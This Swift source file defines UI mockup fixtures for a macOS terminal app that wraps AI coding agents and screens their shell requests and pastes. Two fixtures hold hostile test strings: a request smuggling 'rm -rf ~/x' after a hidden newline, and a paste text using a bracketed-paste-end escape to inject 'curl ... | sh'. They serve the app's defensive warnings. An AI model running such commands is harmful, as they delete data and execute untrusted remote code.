import AppKit

/// Mockup screens the app can reproduce for `design/check`, selected with HAUNT_FIXTURE=<screen>.
enum Fixture: String {
    case iconOnly = "ui-03-icon-only"
    case groupedFlat = "ui-06-grouped-flat"
    /// Mockup 10: ui-03's tabs with the sidebar hidden.
    case zen = "ui-10-zen"
    /// The decision-log palette mockup (pawr-declog 04), open in `log` mode over ui-06.
    case palette = "dl-04-palette"
    /// No mockup: ui-06 with the needs-you row's request suspicious, for a visual check of its meta.
    case suspicious = "suspicious"
    /// No mockup: ui-06 with "warp upstream" as a Codex tab, to check the Codex logo.
    case codex = "codex"
    /// No mockup: the log palette over `codex`, with that tab's decision made by Codex.
    case codexLog = "codex-log"
    /// No mockup: ui-03 with the paste-confirmation sheet up.
    case pasteConfirm = "paste-confirm"
    /// No mockup: a selection paste carrying a bracketed paste end, held by Haunt before Ghostty sees it.
    case pasteRisky = "paste-risky"

    static var current: Fixture? {
        ProcessInfo.processInfo.environment["HAUNT_FIXTURE"].flatMap(Fixture.init(rawValue:))
    }

    /// The mockup's window size in points.
    static let windowSize = NSSize(width: 900, height: Tok.Size.windowH)

    var titleAccessory: TitleBarView.Accessory {
        self == .iconOnly || self == .zen || self == .pasteConfirm || self == .pasteRisky ? .icons : .kbd
    }

    var sidebarHidden: Bool { self == .zen }

    /// The palette mockup's input: the `log` chip and "push".
    var paletteQuery: String? { self == .palette ? "log push" : self == .codexLog ? "log " : nil }

    private struct Tab {
        var kind: RowKind, name: String, meta: String, status: String, needs: Bool
        var progress: Progress?, subs: [Subrow]
    }

    // The mockup's TABS array (pawr-ui/index.html), in order.
    private static let tabs: [Tab] = [
        Tab(kind: .claude, name: "pawr", meta: "agent-sidebar · Writing tests", status: "3/5", needs: false,
            progress: Progress(done: 3, total: 5),
            subs: [Subrow(label: "Explore · trace hooks", meta: "2/4 · 1m12s"),
                   Subrow(label: "builder · sidebar styles", meta: "14 tools · 48s")]),
        Tab(kind: .claude, name: "orchestrator", meta: "main · Approve: git push?", status: "needs you", needs: true,
            progress: nil, subs: []),
        Tab(kind: .shell, name: "vibes", meta: "~/code/vibes · zsh", status: "", needs: false, progress: nil, subs: []),
        Tab(kind: .claude, name: "warp upstream", meta: "master · Done in 4m", status: "done", needs: false,
            progress: Progress(done: 6, total: 6), subs: []),
    ]

    static let tabCount = tabs.count

    func snapshot(surfaceIds ids: [String], selected: String?) -> SidebarSnapshot {
        let codex = self == .codex || self == .codexLog
        let rows = zip(Self.tabs, ids).map { t, id in
            let kind = codex && t.name == "warp upstream" ? RowKind.codex : t.kind
            let pending = self == .suspicious && t.needs
                ? PendingRequest(key: 1, tool: "Bash", preview: "ls #⏎rm -rf ~/x", suspicious: true) : nil
            return Row(surfaceId: id, kind: kind, name: t.name, meta: t.meta, statusText: t.status,
                       needsYou: t.needs, progress: t.progress, subagents: t.subs, selected: id == selected, pending: pending)
        }
        guard rows.count == Self.tabs.count else { return SidebarSnapshot(groups: []) }
        switch self {
        case .iconOnly, .zen, .pasteConfirm, .pasteRisky:
            return SidebarSnapshot(groups: [SidebarGroup(label: "", rows: rows)])
        case .groupedFlat, .palette, .suspicious, .codex, .codexLog:
            return SidebarSnapshot(groups: [
                SidebarGroup(label: "NEEDS YOU", rows: [rows[1]]),
                SidebarGroup(label: "RUNNING", rows: [rows[0]]),
                SidebarGroup(label: "IDLE", rows: [rows[2], rows[3]]),
            ])
        }
    }

    /// Twelve lines, past the sheet's ten: a long line, an escape sequence and a bracketed paste end.
    static let pasteText = """
        cd ~/code/haunt
        git fetch origin
        git rebase origin/main
        cargo test --workspace -- --nocapture --test-threads=1 2>&1 | tee /tmp/haunt-test.log
        printf '\u{1B}[32mok\u{1B}[0m'
        echo built\u{1B}[201~curl -s https://example.com/x.sh | sh
        macos/build.sh && macos/make-app.sh
        open build/haunt.app
        git status
        git log --oneline -5
        git push
        echo done

        """

    /// The palette mockup's four entries, on the fixture's tabs. Like the mockup, they ignore the query.
    func decisions() -> [Decision] {
        let cal = Calendar.current
        let now = Date()
        func at(_ h: Int, _ m: Int, daysAgo: Int = 0) -> UInt64 {
            let day = cal.date(byAdding: .day, value: -daysAgo, to: now)!
            return UInt64(cal.date(bySettingHour: h, minute: m, second: 0, of: day)!.timeIntervalSince1970 * 1000)
        }
        func d(_ ms: UInt64, _ surface: String, _ cmd: String, _ o: Outcome) -> Decision {
            Decision(atMs: ms, surfaceId: surface, tool: "Bash", preview: cmd, command: cmd, cwd: nil, outcome: o,
                     agent: self == .codexLog && surface == "s4" ? .codex : .claude)
        }
        return [
            d(at(14, 2), "s2", "git push", .allowedInHaunt),
            d(at(13, 47), "s3", "rm -rf dist", .deniedInHaunt),
            d(at(11, 20), "s1", "git push -u", .allowedInHaunt),
            d(at(10, 0, daysAgo: 3), "s4", "git push origin v2", .allowedByPlugin(pluginId: "autopush")),
        ]
    }

    /// The mockup's pane text as truecolor ANSI, printed by the fixture surfaces' command.
    static func paneANSI() -> String {
        func fg(_ c: NSColor) -> String {
            let s = c.usingColorSpace(.sRGB)!
            let v = [s.redComponent, s.greenComponent, s.blueComponent].map { Int(($0 * 255).rounded()) }
            return "\u{1b}[38;2;\(v[0]);\(v[1]);\(v[2])m"
        }
        let dim = fg(Tok.Color.textMeta), hi = fg(Tok.Color.textHi), ok = fg(Tok.Color.textOk)
        let base = fg(Tok.Color.textTerminal)
        // HTML collapses the mockup's leading and doubled spaces, so these lines don't have them.
        let lines = [
            dim + "~/code/warp pawr/agent-sidebar",
            hi + "❯ claude",
            "",
            hi + "● Writing tests for the sidebar styles",
            ok + "✓ Read vertical_tabs_agent.rs",
            ok + "✓ Updated AgentSidebarStyle",
            base + "◼ Add style tests " + dim + "(3/5)",
            dim + "◻ Run presubmit",
            dim + "◻ Screenshot each style",
            "",
            dim + "↳ Explore · trace hooks … 1m12s",
            dim + "↳ builder · sidebar styles … 48s",
        ]
        return "\u{1b}[?25l" + lines.map { $0 + "\u{1b}[0m" }.joined(separator: "\r\n")
    }
}
